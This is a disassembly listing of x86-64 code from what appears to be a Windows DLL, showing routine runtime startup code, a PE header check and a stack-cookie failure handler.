   1800024dd:	75 04                	jne    0x1800024e3
   1800024df:	32 c0                	xor    %al,%al
   1800024e1:	eb 14                	jmp    0x1800024f7
   1800024e3:	e8 c0 97 00 00       	call   0x18000bca8
   1800024e8:	84 c0                	test   %al,%al
   1800024ea:	75 09                	jne    0x1800024f5
   1800024ec:	33 c9                	xor    %ecx,%ecx
   1800024ee:	e8 49 15 00 00       	call   0x180003a3c
   1800024f3:	eb ea                	jmp    0x1800024df
   1800024f5:	8a c3                	mov    %bl,%al
   1800024f7:	48 83 c4 20          	add    $0x20,%rsp
   1800024fb:	5b                   	pop    %rbx
   1800024fc:	c3                   	ret
   1800024fd:	cc                   	int3
   1800024fe:	cc                   	int3
   1800024ff:	cc                   	int3
   180002500:	40 53                	rex push %rbx
   180002502:	48 83 ec 20          	sub    $0x20,%rsp
   180002506:	80 3d b4 16 02 00 00 	cmpb   $0x0,0x216b4(%rip)        # 0x180023bc1
   18000250d:	8b d9                	mov    %ecx,%ebx
   18000250f:	75 67                	jne    0x180002578
   180002511:	83 f9 01             	cmp    $0x1,%ecx
   180002514:	77 6a                	ja     0x180002580
   180002516:	e8 b1 09 00 00       	call   0x180002ecc
   18000251b:	85 c0                	test   %eax,%eax
   18000251d:	74 28                	je     0x180002547
   18000251f:	85 db                	test   %ebx,%ebx
   180002521:	75 24                	jne    0x180002547
   180002523:	48 8d 0d 9e 16 02 00 	lea    0x2169e(%rip),%rcx        # 0x180023bc8
   18000252a:	e8 d9 95 00 00       	call   0x18000bb08
   18000252f:	85 c0                	test   %eax,%eax
   180002531:	75 10                	jne    0x180002543
   180002533:	48 8d 0d a6 16 02 00 	lea    0x216a6(%rip),%rcx        # 0x180023be0
   18000253a:	e8 c9 95 00 00       	call   0x18000bb08
   18000253f:	85 c0                	test   %eax,%eax
   180002541:	74 2e                	je     0x180002571
   180002543:	32 c0                	xor    %al,%al
   180002545:	eb 33                	jmp    0x18000257a
   180002547:	66 0f 6f 05 71 5e 01 	movdqa 0x15e71(%rip),%xmm0        # 0x1800183c0
   18000254e:	00 
   18000254f:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180002553:	f3 0f 7f 05 6d 16 02 	movdqu %xmm0,0x2166d(%rip)        # 0x180023bc8
   18000255a:	00 
   18000255b:	48 89 05 76 16 02 00 	mov    %rax,0x21676(%rip)        # 0x180023bd8
   180002562:	f3 0f 7f 05 76 16 02 	movdqu %xmm0,0x21676(%rip)        # 0x180023be0
   180002569:	00 
   18000256a:	48 89 05 7f 16 02 00 	mov    %rax,0x2167f(%rip)        # 0x180023bf0
   180002571:	c6 05 49 16 02 00 01 	movb   $0x1,0x21649(%rip)        # 0x180023bc1
   180002578:	b0 01                	mov    $0x1,%al
   18000257a:	48 83 c4 20          	add    $0x20,%rsp
   18000257e:	5b                   	pop    %rbx
   18000257f:	c3                   	ret
   180002580:	b9 05 00 00 00       	mov    $0x5,%ecx
   180002585:	e8 56 09 00 00       	call   0x180002ee0
   18000258a:	cc                   	int3
   18000258b:	cc                   	int3
   18000258c:	48 83 ec 18          	sub    $0x18,%rsp
   180002590:	4c 8b c1             	mov    %rcx,%r8
   180002593:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   180002598:	66 39 05 61 da ff ff 	cmp    %ax,-0x259f(%rip)        # 0x180000000
   18000259f:	75 78                	jne    0x180002619
   1800025a1:	48 63 0d 94 da ff ff 	movslq -0x256c(%rip),%rcx        # 0x18000003c
   1800025a8:	48 8d 15 51 da ff ff 	lea    -0x25af(%rip),%rdx        # 0x180000000
   1800025af:	48 03 ca             	add    %rdx,%rcx
   1800025b2:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1800025b8:	75 5f                	jne    0x180002619
   1800025ba:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1800025bf:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1800025c3:	75 54                	jne    0x180002619
   1800025c5:	4c 2b c2             	sub    %rdx,%r8
   1800025c8:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1800025cc:	48 8d 51 18          	lea    0x18(%rcx),%rdx
   1800025d0:	48 03 d0             	add    %rax,%rdx
   1800025d3:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1800025d7:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1800025db:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   1800025df:	48 89 14 24          	mov    %rdx,(%rsp)
   1800025e3:	49 3b d1             	cmp    %r9,%rdx
   1800025e6:	74 18                	je     0x180002600
   1800025e8:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   1800025eb:	4c 3b c1             	cmp    %rcx,%r8
   1800025ee:	72 0a                	jb     0x1800025fa
   1800025f0:	8b 42 08             	mov    0x8(%rdx),%eax
   1800025f3:	03 c1                	add    %ecx,%eax
   1800025f5:	4c 3b c0             	cmp    %rax,%r8
   1800025f8:	72 08                	jb     0x180002602
   1800025fa:	48 83 c2 28          	add    $0x28,%rdx
   1800025fe:	eb df                	jmp    0x1800025df
   180002600:	33 d2                	xor    %edx,%edx
   180002602:	48 85 d2             	test   %rdx,%rdx
   180002605:	75 04                	jne    0x18000260b
   180002607:	32 c0                	xor    %al,%al
   180002609:	eb 14                	jmp    0x18000261f
   18000260b:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   18000260f:	7d 04                	jge    0x180002615
   180002611:	32 c0                	xor    %al,%al
   180002613:	eb 0a                	jmp    0x18000261f
   180002615:	b0 01                	mov    $0x1,%al
   180002617:	eb 06                	jmp    0x18000261f
   180002619:	32 c0                	xor    %al,%al
   18000261b:	eb 02                	jmp    0x18000261f
   18000261d:	32 c0                	xor    %al,%al
   18000261f:	48 83 c4 18          	add    $0x18,%rsp
   180002623:	c3                   	ret
   180002624:	40 53                	rex push %rbx
   180002626:	48 83 ec 20          	sub    $0x20,%rsp
   18000262a:	8a d9                	mov    %cl,%bl
   18000262c:	e8 9b 08 00 00       	call   0x180002ecc
   180002631:	33 d2                	xor    %edx,%edx
   180002633:	85 c0                	test   %eax,%eax
   180002635:	74 0b                	je     0x180002642
   180002637:	84 db                	test   %bl,%bl
   180002639:	75 07                	jne    0x180002642
   18000263b:	48 87 15 76 15 02 00 	xchg   %rdx,0x21576(%rip)        # 0x180023bb8
   180002642:	48 83 c4 20          	add    $0x20,%rsp
   180002646:	5b                   	pop    %rbx
   180002647:	c3                   	ret
   180002648:	40 53                	rex push %rbx
   18000264a:	48 83 ec 20          	sub    $0x20,%rsp
   18000264e:	80 3d 6b 15 02 00 00 	cmpb   $0x0,0x2156b(%rip)        # 0x180023bc0
   180002655:	8a d9                	mov    %cl,%bl
   180002657:	74 04                	je     0x18000265d
   180002659:	84 d2                	test   %dl,%dl
   18000265b:	75 0c                	jne    0x180002669
   18000265d:	e8 7e 96 00 00       	call   0x18000bce0
   180002662:	8a cb                	mov    %bl,%cl
   180002664:	e8 d3 13 00 00       	call   0x180003a3c
   180002669:	b0 01                	mov    $0x1,%al
   18000266b:	48 83 c4 20          	add    $0x20,%rsp
   18000266f:	5b                   	pop    %rbx
   180002670:	c3                   	ret
   180002671:	cc                   	int3
   180002672:	cc                   	int3
   180002673:	cc                   	int3
   180002674:	40 53                	rex push %rbx
   180002676:	48 83 ec 20          	sub    $0x20,%rsp
   18000267a:	48 83 3d 46 15 02 00 	cmpq   $0xffffffffffffffff,0x21546(%rip)        # 0x180023bc8
   180002681:	ff 
   180002682:	48 8b d9             	mov    %rcx,%rbx
   180002685:	75 07                	jne    0x18000268e
   180002687:	e8 28 94 00 00       	call   0x18000bab4
   18000268c:	eb 0f                	jmp    0x18000269d
   18000268e:	48 8b d3             	mov    %rbx,%rdx
   180002691:	48 8d 0d 30 15 02 00 	lea    0x21530(%rip),%rcx        # 0x180023bc8
   180002698:	e8 93 94 00 00       	call   0x18000bb30
   18000269d:	33 d2                	xor    %edx,%edx
   18000269f:	85 c0                	test   %eax,%eax
   1800026a1:	48 0f 44 d3          	cmove  %rbx,%rdx
   1800026a5:	48 8b c2             	mov    %rdx,%rax
   1800026a8:	48 83 c4 20          	add    $0x20,%rsp
   1800026ac:	5b                   	pop    %rbx
   1800026ad:	c3                   	ret
   1800026ae:	cc                   	int3
   1800026af:	cc                   	int3
   1800026b0:	48 83 ec 28          	sub    $0x28,%rsp
   1800026b4:	e8 bb ff ff ff       	call   0x180002674
   1800026b9:	48 f7 d8             	neg    %rax
   1800026bc:	1b c0                	sbb    %eax,%eax
   1800026be:	f7 d8                	neg    %eax
   1800026c0:	ff c8                	dec    %eax
   1800026c2:	48 83 c4 28          	add    $0x28,%rsp
   1800026c6:	c3                   	ret
   1800026c7:	cc                   	int3
   1800026c8:	e9 3f fc ff ff       	jmp    0x18000230c
   1800026cd:	cc                   	int3
   1800026ce:	cc                   	int3
   1800026cf:	cc                   	int3
   1800026d0:	40 53                	rex push %rbx
   1800026d2:	48 83 ec 20          	sub    $0x20,%rsp
   1800026d6:	48 8d 05 fb 5c 01 00 	lea    0x15cfb(%rip),%rax        # 0x1800183d8
   1800026dd:	48 8b d9             	mov    %rcx,%rbx
   1800026e0:	48 89 01             	mov    %rax,(%rcx)
   1800026e3:	f6 c2 01             	test   $0x1,%dl
   1800026e6:	74 0a                	je     0x1800026f2
   1800026e8:	ba 18 00 00 00       	mov    $0x18,%edx
   1800026ed:	e8 12 fc ff ff       	call   0x180002304
   1800026f2:	48 8b c3             	mov    %rbx,%rax
   1800026f5:	48 83 c4 20          	add    $0x20,%rsp
   1800026f9:	5b                   	pop    %rbx
   1800026fa:	c3                   	ret
   1800026fb:	cc                   	int3
   1800026fc:	48 83 ec 28          	sub    $0x28,%rsp
   180002700:	85 d2                	test   %edx,%edx
   180002702:	74 39                	je     0x18000273d
   180002704:	83 ea 01             	sub    $0x1,%edx
   180002707:	74 28                	je     0x180002731
   180002709:	83 ea 01             	sub    $0x1,%edx
   18000270c:	74 16                	je     0x180002724
   18000270e:	83 fa 01             	cmp    $0x1,%edx
   180002711:	74 0a                	je     0x18000271d
   180002713:	b8 01 00 00 00       	mov    $0x1,%eax
   180002718:	48 83 c4 28          	add    $0x28,%rsp
   18000271c:	c3                   	ret
   18000271d:	e8 d6 fc ff ff       	call   0x1800023f8
   180002722:	eb 05                	jmp    0x180002729
   180002724:	e8 a7 fc ff ff       	call   0x1800023d0
   180002729:	0f b6 c0             	movzbl %al,%eax
   18000272c:	48 83 c4 28          	add    $0x28,%rsp
   180002730:	c3                   	ret
   180002731:	49 8b d0             	mov    %r8,%rdx
   180002734:	48 83 c4 28          	add    $0x28,%rsp
   180002738:	e9 0f 00 00 00       	jmp    0x18000274c
   18000273d:	4d 85 c0             	test   %r8,%r8
   180002740:	0f 95 c1             	setne  %cl
   180002743:	48 83 c4 28          	add    $0x28,%rsp
   180002747:	e9 18 01 00 00       	jmp    0x180002864
   18000274c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002751:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180002756:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000275b:	41 56                	push   %r14
   18000275d:	48 83 ec 20          	sub    $0x20,%rsp
   180002761:	48 8b f2             	mov    %rdx,%rsi
   180002764:	4c 8b f1             	mov    %rcx,%r14
   180002767:	33 c9                	xor    %ecx,%ecx
   180002769:	e8 46 fd ff ff       	call   0x1800024b4
   18000276e:	84 c0                	test   %al,%al
   180002770:	0f 84 c8 00 00 00    	je     0x18000283e
   180002776:	e8 cd fb ff ff       	call   0x180002348
   18000277b:	8a d8                	mov    %al,%bl
   18000277d:	88 44 24 40          	mov    %al,0x40(%rsp)
   180002781:	40 b7 01             	mov    $0x1,%dil
   180002784:	83 3d 25 14 02 00 00 	cmpl   $0x0,0x21425(%rip)        # 0x180023bb0
   18000278b:	0f 85 c5 00 00 00    	jne    0x180002856
   180002791:	c7 05 15 14 02 00 01 	movl   $0x1,0x21415(%rip)        # 0x180023bb0
   180002798:	00 00 00 
   18000279b:	e8 18 fc ff ff       	call   0x1800023b8
   1800027a0:	84 c0                	test   %al,%al
   1800027a2:	74 4f                	je     0x1800027f3
   1800027a4:	e8 7b 09 00 00       	call   0x180003124
   1800027a9:	e8 2e 09 00 00       	call   0x1800030dc
   1800027ae:	e8 4d 09 00 00       	call   0x180003100
   1800027b3:	48 8d 15 56 5b 01 00 	lea    0x15b56(%rip),%rdx        # 0x180018310
   1800027ba:	48 8d 0d 2f 5b 01 00 	lea    0x15b2f(%rip),%rcx        # 0x1800182f0
   1800027c1:	e8 a6 95 00 00       	call   0x18000bd6c
   1800027c6:	85 c0                	test   %eax,%eax
   1800027c8:	75 29                	jne    0x1800027f3
   1800027ca:	e8 b5 fb ff ff       	call   0x180002384
   1800027cf:	84 c0                	test   %al,%al
   1800027d1:	74 20                	je     0x1800027f3
   1800027d3:	48 8d 15 0e 5b 01 00 	lea    0x15b0e(%rip),%rdx        # 0x1800182e8
   1800027da:	48 8d 0d e7 5a 01 00 	lea    0x15ae7(%rip),%rcx        # 0x1800182c8
   1800027e1:	e8 42 95 00 00       	call   0x18000bd28
   1800027e6:	c7 05 c0 13 02 00 02 	movl   $0x2,0x213c0(%rip)        # 0x180023bb0
   1800027ed:	00 00 00 
   1800027f0:	40 32 ff             	xor    %dil,%dil
   1800027f3:	8a cb                	mov    %bl,%cl
   1800027f5:	e8 2a fe ff ff       	call   0x180002624
   1800027fa:	40 84 ff             	test   %dil,%dil
   1800027fd:	75 3f                	jne    0x18000283e
   1800027ff:	e8 18 09 00 00       	call   0x18000311c
   180002804:	48 8b d8             	mov    %rax,%rbx
   180002807:	48 83 38 00          	cmpq   $0x0,(%rax)
   18000280b:	74 24                	je     0x180002831
   18000280d:	48 8b c8             	mov    %rax,%rcx
   180002810:	e8 77 fd ff ff       	call   0x18000258c
   180002815:	84 c0                	test   %al,%al
   180002817:	74 18                	je     0x180002831
   180002819:	4c 8b c6             	mov    %rsi,%r8
   18000281c:	ba 02 00 00 00       	mov    $0x2,%edx
   180002821:	49 8b ce             	mov    %r14,%rcx
   180002824:	48 8b 03             	mov    (%rbx),%rax
   180002827:	4c 8b 0d 82 5a 01 00 	mov    0x15a82(%rip),%r9        # 0x1800182b0
   18000282e:	41 ff d1             	call   *%r9
   180002831:	ff 05 c1 13 02 00    	incl   0x213c1(%rip)        # 0x180023bf8
   180002837:	b8 01 00 00 00       	mov    $0x1,%eax
   18000283c:	eb 02                	jmp    0x180002840
   18000283e:	33 c0                	xor    %eax,%eax
   180002840:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002845:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000284a:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000284f:	48 83 c4 20          	add    $0x20,%rsp
   180002853:	41 5e                	pop    %r14
   180002855:	c3                   	ret
   180002856:	b9 07 00 00 00       	mov    $0x7,%ecx
   18000285b:	e8 80 06 00 00       	call   0x180002ee0
   180002860:	90                   	nop
   180002861:	cc                   	int3
   180002862:	cc                   	int3
   180002863:	cc                   	int3
   180002864:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002869:	57                   	push   %rdi
   18000286a:	48 83 ec 30          	sub    $0x30,%rsp
   18000286e:	40 8a f9             	mov    %cl,%dil
   180002871:	8b 05 81 13 02 00    	mov    0x21381(%rip),%eax        # 0x180023bf8
   180002877:	85 c0                	test   %eax,%eax
   180002879:	7f 0d                	jg     0x180002888
   18000287b:	33 c0                	xor    %eax,%eax
   18000287d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180002882:	48 83 c4 30          	add    $0x30,%rsp
   180002886:	5f                   	pop    %rdi
   180002887:	c3                   	ret
   180002888:	ff c8                	dec    %eax
   18000288a:	89 05 68 13 02 00    	mov    %eax,0x21368(%rip)        # 0x180023bf8
   180002890:	e8 b3 fa ff ff       	call   0x180002348
   180002895:	8a d8                	mov    %al,%bl
   180002897:	88 44 24 20          	mov    %al,0x20(%rsp)
   18000289b:	83 3d 0e 13 02 00 02 	cmpl   $0x2,0x2130e(%rip)        # 0x180023bb0
   1800028a2:	75 37                	jne    0x1800028db
   1800028a4:	e8 c7 fb ff ff       	call   0x180002470
   1800028a9:	e8 3e 08 00 00       	call   0x1800030ec
   1800028ae:	e8 ad 08 00 00       	call   0x180003160
   1800028b3:	83 25 f6 12 02 00 00 	andl   $0x0,0x212f6(%rip)        # 0x180023bb0
   1800028ba:	8a cb                	mov    %bl,%cl
   1800028bc:	e8 63 fd ff ff       	call   0x180002624
   1800028c1:	33 d2                	xor    %edx,%edx
   1800028c3:	40 8a cf             	mov    %dil,%cl
   1800028c6:	e8 7d fd ff ff       	call   0x180002648
   1800028cb:	f6 d8                	neg    %al
   1800028cd:	1b db                	sbb    %ebx,%ebx
   1800028cf:	83 e3 01             	and    $0x1,%ebx
   1800028d2:	e8 c9 fb ff ff       	call   0x1800024a0
   1800028d7:	8b c3                	mov    %ebx,%eax
   1800028d9:	eb a2                	jmp    0x18000287d
   1800028db:	b9 07 00 00 00       	mov    $0x7,%ecx
   1800028e0:	e8 fb 05 00 00       	call   0x180002ee0
   1800028e5:	90                   	nop
   1800028e6:	90                   	nop
   1800028e7:	cc                   	int3
   1800028e8:	48 8b c4             	mov    %rsp,%rax
   1800028eb:	48 89 58 20          	mov    %rbx,0x20(%rax)
   1800028ef:	4c 89 40 18          	mov    %r8,0x18(%rax)
   1800028f3:	89 50 10             	mov    %edx,0x10(%rax)
   1800028f6:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1800028fa:	56                   	push   %rsi
   1800028fb:	57                   	push   %rdi
   1800028fc:	41 56                	push   %r14
   1800028fe:	48 83 ec 40          	sub    $0x40,%rsp
   180002902:	49 8b f0             	mov    %r8,%rsi
   180002905:	8b fa                	mov    %edx,%edi
   180002907:	4c 8b f1             	mov    %rcx,%r14
   18000290a:	85 d2                	test   %edx,%edx
   18000290c:	75 0f                	jne    0x18000291d
   18000290e:	39 15 e4 12 02 00    	cmp    %edx,0x212e4(%rip)        # 0x180023bf8
   180002914:	7f 07                	jg     0x18000291d
   180002916:	33 c0                	xor    %eax,%eax
   180002918:	e9 ee 00 00 00       	jmp    0x180002a0b
   18000291d:	8d 42 ff             	lea    -0x1(%rdx),%eax
   180002920:	83 f8 01             	cmp    $0x1,%eax
   180002923:	77 45                	ja     0x18000296a
   180002925:	48 8b 05 b4 5a 01 00 	mov    0x15ab4(%rip),%rax        # 0x1800183e0
   18000292c:	48 85 c0             	test   %rax,%rax
   18000292f:	75 0a                	jne    0x18000293b
   180002931:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   180002938:	00 
   180002939:	eb 14                	jmp    0x18000294f
   18000293b:	ff 15 6f 59 01 00    	call   *0x1596f(%rip)        # 0x1800182b0
   180002941:	8b d8                	mov    %eax,%ebx
   180002943:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180002947:	85 c0                	test   %eax,%eax
   180002949:	0f 84 b2 00 00 00    	je     0x180002a01
   18000294f:	4c 8b c6             	mov    %rsi,%r8
   180002952:	8b d7                	mov    %edi,%edx
   180002954:	49 8b ce             	mov    %r14,%rcx
   180002957:	e8 a0 fd ff ff       	call   0x1800026fc
   18000295c:	8b d8                	mov    %eax,%ebx
   18000295e:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180002962:	85 c0                	test   %eax,%eax
   180002964:	0f 84 97 00 00 00    	je     0x180002a01
   18000296a:	4c 8b c6             	mov    %rsi,%r8
   18000296d:	8b d7                	mov    %edi,%edx
   18000296f:	49 8b ce             	mov    %r14,%rcx
   180002972:	e8 09 ee ff ff       	call   0x180001780
   180002977:	8b d8                	mov    %eax,%ebx
   180002979:	89 44 24 30          	mov    %eax,0x30(%rsp)
   18000297d:	83 ff 01             	cmp    $0x1,%edi
   180002980:	75 36                	jne    0x1800029b8
   180002982:	85 c0                	test   %eax,%eax
   180002984:	75 32                	jne    0x1800029b8
   180002986:	4c 8b c6             	mov    %rsi,%r8
   180002989:	33 d2                	xor    %edx,%edx
   18000298b:	49 8b ce             	mov    %r14,%rcx
   18000298e:	e8 ed ed ff ff       	call   0x180001780
   180002993:	48 85 f6             	test   %rsi,%rsi
   180002996:	0f 95 c1             	setne  %cl
   180002999:	e8 c6 fe ff ff       	call   0x180002864
   18000299e:	48 8b 05 3b 5a 01 00 	mov    0x15a3b(%rip),%rax        # 0x1800183e0
   1800029a5:	48 85 c0             	test   %rax,%rax
   1800029a8:	74 0e                	je     0x1800029b8
   1800029aa:	4c 8b c6             	mov    %rsi,%r8
   1800029ad:	33 d2                	xor    %edx,%edx
   1800029af:	49 8b ce             	mov    %r14,%rcx
   1800029b2:	ff 15 f8 58 01 00    	call   *0x158f8(%rip)        # 0x1800182b0
   1800029b8:	85 ff                	test   %edi,%edi
   1800029ba:	74 05                	je     0x1800029c1
   1800029bc:	83 ff 03             	cmp    $0x3,%edi
   1800029bf:	75 40                	jne    0x180002a01
   1800029c1:	4c 8b c6             	mov    %rsi,%r8
   1800029c4:	8b d7                	mov    %edi,%edx
   1800029c6:	49 8b ce             	mov    %r14,%rcx
   1800029c9:	e8 2e fd ff ff       	call   0x1800026fc
   1800029ce:	8b d8                	mov    %eax,%ebx
   1800029d0:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1800029d4:	85 c0                	test   %eax,%eax
   1800029d6:	74 29                	je     0x180002a01
   1800029d8:	48 8b 05 01 5a 01 00 	mov    0x15a01(%rip),%rax        # 0x1800183e0
   1800029df:	48 85 c0             	test   %rax,%rax
   1800029e2:	75 09                	jne    0x1800029ed
   1800029e4:	8d 58 01             	lea    0x1(%rax),%ebx
   1800029e7:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1800029eb:	eb 14                	jmp    0x180002a01
   1800029ed:	4c 8b c6             	mov    %rsi,%r8
   1800029f0:	8b d7                	mov    %edi,%edx
   1800029f2:	49 8b ce             	mov    %r14,%rcx
   1800029f5:	ff 15 b5 58 01 00    	call   *0x158b5(%rip)        # 0x1800182b0
   1800029fb:	8b d8                	mov    %eax,%ebx
   1800029fd:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180002a01:	eb 06                	jmp    0x180002a09
   180002a03:	33 db                	xor    %ebx,%ebx
   180002a05:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180002a09:	8b c3                	mov    %ebx,%eax
   180002a0b:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   180002a10:	48 83 c4 40          	add    $0x40,%rsp
   180002a14:	41 5e                	pop    %r14
   180002a16:	5f                   	pop    %rdi
   180002a17:	5e                   	pop    %rsi
   180002a18:	c3                   	ret
   180002a19:	cc                   	int3
   180002a1a:	cc                   	int3
   180002a1b:	cc                   	int3
   180002a1c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002a21:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180002a26:	57                   	push   %rdi
   180002a27:	48 83 ec 20          	sub    $0x20,%rsp
   180002a2b:	49 8b f8             	mov    %r8,%rdi
   180002a2e:	8b da                	mov    %edx,%ebx
   180002a30:	48 8b f1             	mov    %rcx,%rsi
   180002a33:	83 fa 01             	cmp    $0x1,%edx
   180002a36:	75 05                	jne    0x180002a3d
   180002a38:	e8 f3 05 00 00       	call   0x180003030
   180002a3d:	4c 8b c7             	mov    %rdi,%r8
   180002a40:	8b d3                	mov    %ebx,%edx
   180002a42:	48 8b ce             	mov    %rsi,%rcx
   180002a45:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002a4a:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180002a4f:	48 83 c4 20          	add    $0x20,%rsp
   180002a53:	5f                   	pop    %rdi
   180002a54:	e9 8f fe ff ff       	jmp    0x1800028e8
   180002a59:	cc                   	int3
   180002a5a:	cc                   	int3
   180002a5b:	cc                   	int3
   180002a5c:	40 53                	rex push %rbx
   180002a5e:	48 83 ec 20          	sub    $0x20,%rsp
   180002a62:	48 8b d9             	mov    %rcx,%rbx
   180002a65:	33 c9                	xor    %ecx,%ecx
   180002a67:	ff 15 1b 56 01 00    	call   *0x1561b(%rip)        # 0x180018088
   180002a6d:	48 8b cb             	mov    %rbx,%rcx
   180002a70:	ff 15 0a 56 01 00    	call   *0x1560a(%rip)        # 0x180018080
   180002a76:	ff 15 14 56 01 00    	call   *0x15614(%rip)        # 0x180018090
   180002a7c:	48 8b c8             	mov    %rax,%rcx
   180002a7f:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   180002a84:	48 83 c4 20          	add    $0x20,%rsp
   180002a88:	5b                   	pop    %rbx
   180002a89:	48 ff 25 08 56 01 00 	rex.W jmp *0x15608(%rip)        # 0x180018098
   180002a90:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180002a95:	48 83 ec 38          	sub    $0x38,%rsp
   180002a99:	b9 17 00 00 00       	mov    $0x17,%ecx
   180002a9e:	e8 f2 48 01 00       	call   0x180017395
   180002aa3:	85 c0                	test   %eax,%eax
   180002aa5:	74 07                	je     0x180002aae
   180002aa7:	b9 02 00 00 00       	mov    $0x2,%ecx
   180002aac:	cd 29                	int    $0x29
   180002aae:	48 8d 0d eb 11 02 00 	lea    0x211eb(%rip),%rcx        # 0x180023ca0
   180002ab5:	e8 ca 01 00 00       	call   0x180002c84
   180002aba:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180002abf:	48 89 05 d2 12 02 00 	mov    %rax,0x212d2(%rip)        # 0x180023d98
   180002ac6:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   180002acb:	48 83 c0 08          	add    $0x8,%rax
   180002acf:	48 89 05 62 12 02 00 	mov    %rax,0x21262(%rip)        # 0x180023d38
   180002ad6:	48 8b 05 bb 12 02 00 	mov    0x212bb(%rip),%rax        # 0x180023d98
   180002add:	48 89 05 2c 11 02 00 	mov    %rax,0x2112c(%rip)        # 0x180023c10
   180002ae4:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180002ae9:	48 89 05 30 12 02 00 	mov    %rax,0x21230(%rip)        # 0x180023d20
   180002af0:	c7 05 06 11 02 00 09 	movl   $0xc0000409,0x21106(%rip)        # 0x180023c00
   180002af7:	04 00 c0 
   180002afa:	c7 05 00 11 02 00 01 	movl   $0x1,0x21100(%rip)        # 0x180023c04
   180002b01:	00 00 00 
   180002b04:	c7 05 0a 11 02 00 01 	movl   $0x1,0x2110a(%rip)        # 0x180023c18
   180002b0b:	00 00 00 
   180002b0e:	b8 08 00 00 00       	mov    $0x8,%eax
   180002b13:	48 6b c0 00          	imul   $0x0,%rax,%rax
   180002b17:	48 8d 0d 02 11 02 00 	lea    0x21102(%rip),%rcx        # 0x180023c20
   180002b1e:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   180002b25:	00 
   180002b26:	b8 08 00 00 00       	mov    $0x8,%eax
   180002b2b:	48 6b c0 00          	imul   $0x0,%rax,%rax
   180002b2f:	48 8b 0d da 04 02 00 	mov    0x204da(%rip),%rcx        # 0x180023010
   180002b36:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   180002b3b:	b8 08 00 00 00       	mov    $0x8,%eax
   180002b40:	48 6b c0 01          	imul   $0x1,%rax,%rax
   180002b44:	48 8b 0d bd 04 02 00 	mov    0x204bd(%rip),%rcx        # 0x180023008
   180002b4b:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   180002b50:	48 8d 0d 91 58 01 00 	lea    0x15891(%rip),%rcx        # 0x1800183e8
   180002b57:	e8 00 ff ff ff       	call   0x180002a5c
   180002b5c:	48 83 c4 38          	add    $0x38,%rsp
   180002b60:	c3                   	ret
   180002b61:	cc                   	int3
   180002b62:	cc                   	int3
   180002b63:	cc                   	int3
   180002b64:	48 83 ec 28          	sub    $0x28,%rsp
   180002b68:	b9 08 00 00 00       	mov    $0x8,%ecx
   180002b6d:	e8 06 00 00 00       	call   0x180002b78
   180002b72:	48 83 c4 28          	add    $0x28,%rsp
   180002b76:	c3                   	ret
   180002b77:	cc                   	int3
   180002b78:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   180002b7c:	48 83 ec 28          	sub    $0x28,%rsp
   180002b80:	b9 17 00 00 00       	mov    $0x17,%ecx
   180002b85:	e8 0b 48 01 00       	call   0x180017395
   180002b8a:	85 c0                	test   %eax,%eax
   180002b8c:	74 08                	je     0x180002b96
   180002b8e:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002b92:	8b c8                	mov    %eax,%ecx
   180002b94:	cd 29                	int    $0x29
   180002b96:	48 8d 0d 03 11 02 00 	lea    0x21103(%rip),%rcx        # 0x180023ca0
   180002b9d:	e8 72 00 00 00       	call   0x180002c14
   180002ba2:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   180002ba7:	48 89 05 ea 11 02 00 	mov    %rax,0x211ea(%rip)        # 0x180023d98
   180002bae:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
   180002bb3:	48 83 c0 08          	add    $0x8,%rax
   180002bb7:	48 89 05 7a 11 02 00 	mov    %rax,0x2117a(%rip)        # 0x180023d38
   180002bbe:	48 8b 05 d3 11 02 00 	mov    0x211d3(%rip),%rax        # 0x180023d98
   180002bc5:	48 89 05 44 10 02 00 	mov    %rax,0x21044(%rip)        # 0x180023c10
   180002bcc:	c7 05 2a 10 02 00 09 	movl   $0xc0000409,0x2102a(%rip)        # 0x180023c00
   180002bd3:	04 00 c0 
   180002bd6:	c7 05 24 10 02 00 01 	movl   $0x1,0x21024(%rip)        # 0x180023c04
   180002bdd:	00 00 00 
   180002be0:	c7 05 2e 10 02 00 01 	movl   $0x1,0x2102e(%rip)        # 0x180023c18
